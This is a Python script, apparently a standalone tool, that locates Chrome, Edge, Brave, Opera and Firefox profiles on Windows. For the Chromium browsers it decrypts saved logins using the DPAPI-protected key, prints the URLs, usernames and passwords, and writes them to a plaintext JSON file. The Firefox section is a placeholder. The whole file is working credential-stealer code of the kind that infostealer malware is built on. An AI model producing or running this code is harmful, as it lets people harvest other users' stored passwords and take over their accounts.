import os
import json
import base64
import sqlite3
import shutil
import glob
from Crypto.Cipher import AES
import win32crypt

class BrowserPasswordExtractor:
    def __init__(self):
        self.browsers = {
            "Chrome": self.get_chrome_paths,
            "Edge": self.get_edge_paths, 
            "Brave": self.get_brave_paths,
            "Opera": self.get_opera_paths,
            "Firefox": self.get_firefox_paths
        }
    
    def get_chrome_paths(self):
        """Get Chrome profile paths"""
        base_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Google", "Chrome", "User Data")
        return self._get_chromium_profiles(base_path)
    
    def get_edge_paths(self):
        """Get Microsoft Edge profile paths"""
        base_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "Microsoft", "Edge", "User Data")
        return self._get_chromium_profiles(base_path)
    
    def get_brave_paths(self):
        """Get Brave browser profile paths"""
        base_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data")
        return self._get_chromium_profiles(base_path)
    
    def get_opera_paths(self):
        """Get Opera profile paths"""
        base_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Opera Software", "Opera Stable")
        profiles = []
        if os.path.exists(base_path):
            login_data = os.path.join(base_path, "Login Data")
            if os.path.exists(login_data):
                profiles.append(("Default", base_path))
        return profiles
    
    def get_firefox_paths(self):
        """Get Firefox profile paths"""
        firefox_path = os.path.join(os.environ['USERPROFILE'], "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
        profiles = []
        if os.path.exists(firefox_path):
            for profile_dir in glob.glob(os.path.join(firefox_path, "*.default*")):
                profile_name = os.path.basename(profile_dir)
                profiles.append((profile_name, profile_dir))
        return profiles
    
    def _get_chromium_profiles(self, base_path):
        """Get profiles for Chromium-based browsers"""
        profiles = []
        if os.path.exists(base_path):
            # Default profile
            default_profile = os.path.join(base_path, "Default")
            if os.path.exists(os.path.join(default_profile, "Login Data")):
                profiles.append(("Default", default_profile))
            
            # Other profiles
            for profile_dir in glob.glob(os.path.join(base_path, "Profile *")):
                if os.path.exists(os.path.join(profile_dir, "Login Data")):
                    profile_name = os.path.basename(profile_dir)
                    profiles.append((profile_name, profile_dir))
        return profiles
    
    def get_encryption_key(self, browser_path):
        """Get encryption key for Chromium-based browsers"""
        local_state_path = os.path.join(browser_path, "Local State")
        
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
        except Exception as e:
            print(f"    ‚ùå Error getting encryption key: {e}")
            return None
    
    def decrypt_chromium_password(self, encrypted_password, key):
        """Decrypt Chromium-based browser passwords"""
        try:
            if not encrypted_password:
                return None
                
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v20'):
                # AES-GCM encryption
                if len(encrypted_password) < 15:
                    return None
                    
                iv = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]
                
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(ciphertext, tag)
                return decrypted.decode('utf-8')
            else:
                # DPAPI encryption
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                    return decrypted.decode('utf-8')
                except:
                    return None
                    
        except Exception:
            return None
    
    def decrypt_firefox_password(self, profile_path):
        """Extract Firefox passwords (simplified - requires master password handling)"""
        # Firefox uses a different encryption system
        # This is a simplified version that may not work if master password is set
        try:
            signons_path = os.path.join(profile_path, "signons.sqlite")
            logins_path = os.path.join(profile_path, "logins.json")
            
            passwords = []
            
            # Try old format (signons.sqlite)
            if os.path.exists(signons_path):
                temp_db = "temp_firefox.db"
                shutil.copy2(signons_path, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins")
                for host, enc_user, enc_pass in cursor.fetchall():
                    # Firefox decryption is complex and requires key4.db/key3.db
                    # This is a placeholder - actual implementation is more complex
                    passwords.append({
                        "url": host,
                        "username": "[Firefox - Requires Master Password]",
                        "password": "[Firefox - Requires Master Password]"
                    })
                
                cursor.close()
                conn.close()
                os.remove(temp_db)
            
            # Try new format (logins.json)
            elif os.path.exists(logins_path):
                with open(logins_path, "r", encoding="utf-8") as f:
                    logins_data = json.load(f)
                
                for login in logins_data.get("logins", []):
                    passwords.append({
                        "url": login.get("hostname", ""),
                        "username": "[Firefox - Encrypted]",
                        "password": "[Firefox - Encrypted]"
                    })
            
            return passwords
            
        except Exception as e:
            print(f"    ‚ùå Firefox decryption error: {e}")
            return []
    
    def extract_chromium_passwords(self, browser_name, profile_name, profile_path, key):
        """Extract passwords from Chromium-based browsers"""
        db_path = os.path.join(profile_path, "Login Data")
        
        if not os.path.exists(db_path):
            return []
        
        try:
            temp_db = f"temp_{browser_name}_{profile_name}.db"
            shutil.copy2(db_path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            entries = cursor.fetchall()
            
            passwords = []
            for url, username, encrypted_password in entries:
                if encrypted_password:
                    password = self.decrypt_chromium_password(encrypted_password, key)
                    if password and username:
                        passwords.append({
                            "url": url,
                            "username": username,
                            "password": password
                        })
            
            cursor.close()
            conn.close()
            os.remove(temp_db)
            
            return passwords
            
        except Exception as e:
            print(f"    ‚ùå Error extracting from {browser_name}: {e}")
            return []
    
    def scan_all_browsers(self):
        """Scan all browsers for passwords"""
        print("üåê Multi-Browser Password Extractor")
        print("=" * 60)
        print("Scanning all major browsers...")
        print()
        
        all_results = {}
        
        for browser_name, profile_func in self.browsers.items():
            print(f"üîç Scanning {browser_name}...")
            
            try:
                profiles = profile_func()
                
                if not profiles:
                    print(f"   ‚ùå {browser_name} not found or no profiles")
                    continue
                
                print(f"   ‚úì Found {len(profiles)} profile(s)")
                
                browser_passwords = []
                
                for profile_name, profile_path in profiles:
                    if browser_name == "Firefox":
                        # Firefox uses different encryption
                        passwords = self.decrypt_firefox_password(profile_path)
                    else:
                        # Chromium-based browsers
                        key = self.get_encryption_key(os.path.dirname(profile_path))
                        if not key:
                            continue
                        passwords = self.extract_chromium_passwords(browser_name, profile_name, profile_path, key)
                    
                    browser_passwords.extend(passwords)
                    print(f"      üìÅ {profile_name}: {len(passwords)} passwords")
                
                all_results[browser_name] = browser_passwords
                print(f"   ‚úÖ {browser_name}: {len(browser_passwords)} total passwords")
                
            except Exception as e:
                print(f"   ‚ùå Error scanning {browser_name}: {e}")
            
            print()
        
        return all_results
    
    def display_results(self, results):
        """Display extracted passwords"""
        print("üìã EXTRACTION RESULTS")
        print("=" * 80)
        
        total_passwords = 0
        for browser_name, passwords in results.items():
            if passwords:
                print(f"\nüñ•Ô∏è  {browser_name.upper()} ({len(passwords)} passwords):")
                print("-" * 60)
                
                for i, entry in enumerate(passwords[:10], 1):  # Show first 10
                    print(f"  {i:2d}. üåê {entry['url']}")
                    print(f"      üë§ {entry['username']}")
                    print(f"      üîë {entry['password']}")
                
                if len(passwords) > 10:
                    print(f"  ... and {len(passwords) - 10} more passwords")
                
                total_passwords += len(passwords)
        
        print(f"\nüìä SUMMARY: Found {total_passwords} total passwords across {len([p for p in results.values() if p])} browsers")
        
        # Save to file
        self.save_to_file(results)
    
    def save_to_file(self, results):
        """Save results to JSON file"""
        import datetime
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"browser_passwords_{timestamp}.json"
        
        # Convert to serializable format
        serializable_results = {}
        for browser, passwords in results.items():
            serializable_results[browser] = passwords
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(serializable_results, f, indent=2, ensure_ascii=False)
        
        print(f"üíæ Results saved to: {filename}")

def main():
    print("üöÄ Starting Multi-Browser Password Extraction...")
    print("‚ö†Ô∏è  Make sure all browsers are closed before running!")
    print()
    
    input("Press Enter to continue...")
    
    extractor = BrowserPasswordExtractor()
    results = extractor.scan_all_browsers()
    extractor.display_results(results)

if __name__ == "__main__":
    main()
